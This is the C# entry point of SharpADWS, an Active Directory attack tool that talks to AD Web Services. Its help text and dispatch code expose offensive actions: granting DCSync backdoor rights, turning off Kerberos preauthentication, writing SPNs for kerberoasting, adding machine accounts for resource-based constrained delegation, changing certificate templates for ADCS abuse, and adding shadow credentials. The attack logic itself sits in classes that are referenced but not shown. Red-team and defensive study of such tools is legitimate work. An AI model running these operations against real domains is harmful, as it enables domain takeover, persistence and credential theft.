using System;
using System.Collections.Generic;
using System.Net;
using System.Net.NetworkInformation;
using SharpADWS.ADWS;
using SharpADWS.ADWS.Enumeration;
using SharpADWS.Methods;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using SharpADWS.Methods.ACL;
using SharpADWS.Methods.ADCS;
using SharpADWS.Methods.Certify;

namespace SharpADWS
{
    internal class Program
    {
        public static int Port = 9389;
        public static NetworkCredential Credential = null;

        private static string GetCurrentDomain()
        {
            return IPGlobalProperties.GetIPGlobalProperties().DomainName;
        }

        public static void Main(string[] args)
        {
            if (args.Length > 0)
            {
                Options options = new Options(args);
                if(options.DisplayHelp)
                {
                    DisplayHelp();
                    return;
                }
                Run(options);
            }
            else
            {
                DisplayHelp();
            }
        }

        private static void DisplayHelp()
        {
            Console.WriteLine();
            Console.WriteLine("SharpADWS 1.0.0-beta - Copyright (c) 2024 WHOAMI (whoamianony.top)");
            Console.WriteLine();
            Console.WriteLine("  -h                      Display this help screen");
            Console.WriteLine();
            Console.WriteLine("Connection options:");
            Console.WriteLine("  -d                      Specify domain for enumeration");
            Console.WriteLine("  -u                      Username to use for ADWS Connection");
            Console.WriteLine("  -p                      Password to use for ADWS Connection");
            Console.WriteLine();
            Console.WriteLine("Supported methods:");
            Console.WriteLine("  Cache                   Dump all objectSids to cache file for Acl methods");
            Console.WriteLine("  Acl                     Enumerate and analyze DACLs for specified objects, specifically Users, Computers, Groups, Domains, DomainControllers and GPOs");
            Console.WriteLine("  DCSync                  Enumerate all DCSync-capable accounts and can set DCSync backdoors");
            Console.WriteLine("  DontReqPreAuth          Enumerates all accounts that do not require kerberos preauthentication, and can enable this option for accounts");
            Console.WriteLine("  Kerberoastable          Enumerates all Kerberoastable accounts, and can write SPNs for accounts");
            Console.WriteLine("  AddComputer             Add a machine account within the scope of ms-DS-MachineAccountQuota for RBCD attack");
            Console.WriteLine("  RBCD                    Read, write and remove msDS-AllowedToActOnBehalfOfOtherIdentity attributes for Resource-Based Constrained Delegation attack");
            Console.WriteLine("  Certify                 Enumerate all ADCS data like Certify.exe, and can write template attributes");
            Console.WriteLine("  Whisker                 List, add and remove msDS-KeyCredentialLink attribute like Whisker.exe for ShadowCredentials attack");
            Console.WriteLine("  FindDelegation          Enumerate all delegation relationships for the target domain");
            Console.WriteLine();
            Console.WriteLine("Acl options:");
            Console.WriteLine("  -dn                     RFC 2253 DN to base search from");
            Console.WriteLine("  -scope                  Set your Scope, support Base (Default), Onelevel, Subtree");
            Console.WriteLine("  -trustee                The sAMAccountName of a security principal to check for its effective permissions");
            Console.WriteLine("  -right                  Filter DACL for a specific AD rights");
            Console.WriteLine("  -rid                    Specify a rid value and filter out DACL that security principal's rid is greater than it");
            Console.WriteLine("  -user                   Enumerate DACL for all user objects");
            Console.WriteLine("  -computer               Enumerate DACL for all computer objects");
            Console.WriteLine("  -group                  Enumerate DACL for all group objects");
            Console.WriteLine("  -domain                 Enumerate DACL for all domain objects");
            Console.WriteLine("  -domaincontroller       Enumerate DACL for all domain controller objects");
            Console.WriteLine("  -gpo                    Enumerate DACL for all gpo objects");
            Console.WriteLine();
            Console.WriteLine("DCSync options:");
            Console.WriteLine("  -action [{list, write}] Action to operate on DCSync method");
            Console.WriteLine("          list            List all accounts with DCSync permissions");
            Console.WriteLine("          write           Escalate accounts with DCSync permissions");
            Console.WriteLine("  -target                 Specify the sAMAccountName of the account");
            Console.WriteLine();
            Console.WriteLine("DontReqPreAuth options:");
            Console.WriteLine("  -action [{list, write}] Action to operate on DontReqPreAuth method");
            Console.WriteLine("          list            List all accounts that do not require kerberos preauthentication");
            Console.WriteLine("          write           Enable do not require kerberos preauthentication for an account");
            Console.WriteLine("  -target                 Specify the sAMAccountName of the account");
            Console.WriteLine();
            Console.WriteLine("Kerberoastable options:");
            Console.WriteLine("  -action [{list, write}] Action to operate on Kerberoastable method");
            Console.WriteLine("          list            List all kerberoastable accounts");
            Console.WriteLine("          write           Write SPNs for an account to kerberoast");
            Console.WriteLine("  -target                 Specify the sAMAccountName of the account");
            Console.WriteLine();
            Console.WriteLine("AddComputer options:");
            Console.WriteLine("  -computer-name          Name of computer to add, without '$' suffix");
            Console.WriteLine("  -computer-pass          Password to set for the computer");
            Console.WriteLine();
            Console.WriteLine("RBCD options:");
            Console.WriteLine("  -action [{read,write,remove}]");
            Console.WriteLine("                          Action to operate on RBCD method");
            Console.WriteLine("          read            Read the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the account");
            Console.WriteLine("          write           Write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute of the account");
            Console.WriteLine("          remove          Remove the msDS-AllowedToActOnBehalfOfOtherIdentity attribute value of the account added by the write action");
            Console.WriteLine();
            Console.WriteLine("Certify options:");
            Console.WriteLine("  -action [{find, modify}]");
            Console.WriteLine("                          Action to operate on Certify method");
            Console.WriteLine("          find            Find all CA and certificate templates");
            Console.WriteLine("          modify          Modify certificate templates");
            Console.WriteLine("  -enrolleeSuppliesSubject");
            Console.WriteLine("                          Enumerate certificate templates with CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag for find action,");
            Console.WriteLine("                          and can enable CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag for modify action");
            Console.WriteLine("  -clientAuth             Enumerate certificate templates with client authentication pKIExtendedKeyUsage for find action,");
            Console.WriteLine("                          and can enable Client Authentication for modify action");
            Console.WriteLine();
            Console.WriteLine("Whisker options:");
            Console.WriteLine("  -action [{list, add, remove}]");
            Console.WriteLine("                          Action to operate on ShadowCredentials method");
            Console.WriteLine("          list            List all the values of the msDS-KeyCredentialLink attribute for an account");
            Console.WriteLine("          add             Add a new value to the msDS-KeyCredentialLink attribute for an account");
            Console.WriteLine("          remove          Remove a value from the msDS-KeyCredentialLink attribute for an account");
            Console.WriteLine("  -device-id              Specify the DeviceID to remove");
            Console.WriteLine("  -target                 Specify the sAMAccountName of the account");
            Console.WriteLine();
            Console.WriteLine("FindDelegation options:");
            Console.WriteLine("  No options, just run!");
        }

        private static void Run(Options options)
        {
            if(String.IsNullOrEmpty(options.DomainName))
            {
                options.DomainName = GetCurrentDomain();
            }

            if (!String.IsNullOrEmpty(options.Username))
            {
                if (String.IsNullOrEmpty(options.Password))
                {
                    Console.WriteLine("Missing password parameter: -p.");
                }
                Credential = new NetworkCredential(options.Username, options.Password, options.DomainName);
            }

            ADWSConnection adwsConnection = new ADWSConnection(options.DomainName, "ldap:389", Credential);

            if (options.Method.ToLower() == "cache")
            {
                ADObjectCache ADObjectCache = new ADObjectCache();
                EnumerateRequest enumerateRequest = new EnumerateRequest(adwsConnection);
                List<ADObject> adObjects = enumerateRequest.Enumerate("(!SharpADWS=*)", adwsConnection.DefaultNamingContext, "subtree", new string[] {
                    "name", "objectSid"
                });

                foreach (ADObject adObject in adObjects)
                {
                    if (adObject.ObjectSid != null && adObject.Name != null)
                    {
                        ADObjectCache.AddCacheValue(adObject.ObjectSid, adObject.Name);
                    }
                }

                FileStream fileStream = new FileStream("object.cache", FileMode.Create);
                BinaryFormatter binaryFormatter = new BinaryFormatter();
                binaryFormatter.Serialize(fileStream, ADObjectCache);
                fileStream.Close();

                Console.WriteLine("\n[*] Cache file has been generated: object.cache");
            }
            else if(options.Method.ToLower() == "acl")
            {
                if(options.isUser)
                {
                    User userAcl = new User(adwsConnection);
                    userAcl.Run(options.Trustee, options.Right, options.Rid, options.OutputFormat);
                }
                else if (options.isComputer)
                {
                    Computer computerAcl = new Computer(adwsConnection);
                    computerAcl.Run(options.Trustee, options.Right, options.Rid, options.OutputFormat);
                }
                else if (options.isGroup)
                {
                    Group groupAcl = new Group(adwsConnection);
                    groupAcl.Run(options.Trustee, options.Right, options.Rid, options.OutputFormat);
                }
                else if (options.isDomain)
                {
                    Domain domainAcl = new Domain(adwsConnection);
                    domainAcl.Run(options.Trustee, options.Right, options.Rid, options.OutputFormat);
                }
                else if (options.isDomainController)
                {
                    DomainController domainControllerAcl = new DomainController(adwsConnection);
                    domainControllerAcl.Run(options.Trustee, options.Right, options.Rid, options.OutputFormat);
                }
                else if (options.isGpo)
                {
                    Gpo gpoAcl = new Gpo(adwsConnection);
                    gpoAcl.Run(options.Trustee, options.Right, options.Rid, options.OutputFormat);
                }
                else
                {
                    if (String.IsNullOrEmpty(options.DistinguishedName))
                    {
                        Console.WriteLine("[-] Missing parameter: -dn");
                        return;
                    }
                    ACLSearch aclSearch = new ACLSearch(adwsConnection);
                    aclSearch.Run(options.DistinguishedName, options.Scope, options.Trustee, options.Right, options.Rid, options.OutputFormat);
                }
            }
            else if(options.Method.ToLower() == "dcsync")
            {
                if (String.IsNullOrEmpty(options.Action))
                {
                    Console.WriteLine("[-] No action to operate: -action [{list, write}]");
                    return;
                }

                DCSync dCSync = new DCSync(adwsConnection);

                if (options.Action.ToLower() == "list")
                {
                    dCSync.FindDCSync();
                }
                else if (options.Action.ToLower() == "write")
                {
                    if (String.IsNullOrEmpty(options.Target)) 
                    {
                        Console.WriteLine("[-] Missing parameter: -target");
                        return;
                    }
                    dCSync.WriteDCSync(options.Target);
                }
            }
            else if(options.Method.ToLower() == "dontreqpreauth")
            {
                if (String.IsNullOrEmpty(options.Action))
                {
                    Console.WriteLine("[-] No action to operate: -action [{list, write}]");
                    return;
                }

                DontReqPreAuth dontReqPreAuth = new DontReqPreAuth(adwsConnection);
                if(options.Action.ToLower() == "list")
                {
                    dontReqPreAuth.FindDontReqPreAuth();
                }
                else if(options.Action.ToLower() == "write")
                {
                    if (String.IsNullOrEmpty(options.Target))
                    {
                        Console.WriteLine("[-] Missing parameter: -target [{list, write}]");
                        return;
                    }
                    dontReqPreAuth.SetDontReqPreAuth(options.Target);
                }
            }
            else if (options.Method.ToLower() == "kerberoastable")
            {
                if (String.IsNullOrEmpty(options.Action))
                {
                    Console.WriteLine("[-] No action to operate: -action");
                    return;
                }

                Kerberoastable kerberoastable = new Kerberoastable(adwsConnection);
                if (options.Action.ToLower() == "list")
                {
                    kerberoastable.FindKerberoastable();
                }
                else if (options.Action.ToLower() == "write")
                {
                    if (String.IsNullOrEmpty(options.Target))
                    {
                        Console.WriteLine("[-] Missing parameter: -target");
                        return;
                    }
                    kerberoastable.SetKerberoastable(options.Target);
                }
            }
            else if (options.Method.ToLower() == "addcomputer")
            {
                if (String.IsNullOrEmpty(options.ComputerName) || String.IsNullOrEmpty(options.ComputerPass))
                {
                    Console.WriteLine("[-] Missing parameter: -computer-name, -computer-pass");
                    return;
                }
                AddComputer addComputer = new AddComputer(adwsConnection);
                addComputer.Add(options.ComputerName, options.ComputerPass);
            }
            else if (options.Method.ToLower() == "rbcd")
            {
                if (String.IsNullOrEmpty(options.Action))
                {
                    Console.WriteLine("[-] No action to operate: -action [{read,write,remove}]");
                    return;
                }

                AllowedToAct rbcd = new AllowedToAct(adwsConnection);

                if (options.Action.ToLower() == "write")
                {
                    if (String.IsNullOrEmpty(options.DelegateTo) || String.IsNullOrEmpty(options.DelegateFrom))
                    {
                        Console.WriteLine("[-] Missing parameter: -delegate-to, -delegate-from");
                        return;
                    }
                    rbcd.WriteAllowedToAct(options.DelegateTo, options.DelegateFrom);
                }
                else if(options.Action.ToLower() == "read")
                {
                    if (String.IsNullOrEmpty(options.DelegateTo))
                    {
                        Console.WriteLine("[-] Missing parameter: -delegate-to");
                        return;
                    }
                    rbcd.ReadAllowedToAct(options.DelegateTo);
                }
                else if(options.Action.ToLower() == "remove")
                {
                    if (String.IsNullOrEmpty(options.DelegateTo) || String.IsNullOrEmpty(options.DelegateFrom))
                    {
                        Console.WriteLine("[-] Missing parameter: -delegate-to, -delegate-from");
                        return;
                    }
                    rbcd.RemoveAllowedToAct(options.DelegateTo, options.DelegateFrom);
                }
                
            }
            else if(options.Method.ToLower() == "certify")
            {
                if (String.IsNullOrEmpty(options.Action))
                {
                    Console.WriteLine("[-] No action to operate: -action [{find, modify}]");
                    return;
                }

                if (options.Action.ToLower() == "find")
                {
                    FindCAs dindCAs = new FindCAs(adwsConnection);
                    dindCAs.Run(options.Vulnerable, options.EnrolleeSuppliesSubject, options.ClientAuth);
                }
                else if(options.Action.ToLower() == "modify")
                {
                    if (String.IsNullOrEmpty(options.Template))
                    {
                        Console.WriteLine("[-] Missing parameter: -template");
                        return;
                    }

                    ModifyCATemplates modifyCATemplates = new ModifyCATemplates(adwsConnection);

                    if (options.EnrolleeSuppliesSubject)
                    {
                        modifyCATemplates.EnableEnrolleeSuppliesSubject(options.Template);
                    }

                    if (options.ClientAuth)
                    {
                        modifyCATemplates.EnableClientAuthentication(options.Template);
                    }
                }
            }
            else if (options.Method.ToLower() == "whisker")
            {
                if (String.IsNullOrEmpty(options.Action))
                {
                    Console.WriteLine("[-] No action to operate: -action [{list, add, remove}]");
                    return;
                }

                if (String.IsNullOrEmpty(options.Target))
                {
                    Console.WriteLine("[-] Missing parameter: -target");
                    return;
                }

                Whisker shadowCredentials = new Whisker(adwsConnection);

                if (options.Action.ToLower() == "list")
                {
                    shadowCredentials.ListKeyCredentialLink(options.Target);
                }
                else if (options.Action.ToLower() == "add")
                {
                    shadowCredentials.AddKeyCredentialLink(options.Target, options.CertPassword, options.Filename, options.noWrap);
                }
                else if (options.Action.ToLower() == "remove")
                {
                    if(String.IsNullOrEmpty(options.DeviceID))
                    {
                        Console.WriteLine("[-] Missing parameter: -device-id");
                        return;
                    }
                    shadowCredentials.RemoveKeyCredentialLink(options.Target, options.DeviceID);
                }

            }
            else if (options.Method.ToLower() == "finddelegation")
            {
                FindDelegation findDelegation = new FindDelegation(adwsConnection);
                findDelegation.FindAllDelegation();
            }
        }
    }
}